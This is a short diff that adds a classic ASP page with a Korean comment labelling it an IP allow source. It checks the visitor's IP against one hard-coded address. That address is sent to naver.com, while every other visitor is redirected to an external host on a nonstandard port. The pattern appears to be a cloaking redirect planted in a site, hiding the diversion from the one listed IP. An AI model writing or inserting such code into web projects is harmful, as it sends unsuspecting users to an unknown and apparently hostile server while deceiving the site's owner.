@@ -1,0 +1,17 @@
+
+<!-- 아이피 허용소스-->
+<%
+strIP = Request.ServerVariables("REMOTE_ADDR")
+ 
+aIP = Array("125.24.160.108")
+ 
+aFilter = Filter(aIP, strIP)
+ 
+if 0 <= UBound( aFilter ) Then
+    ' 허용목록에 있을경우
+    Response.Redirect "http://naver.com"
+Else 
+    Response.Redirect "http://soso36.ss-ax.com:19772/index.asp"
+end if  
+%>
+
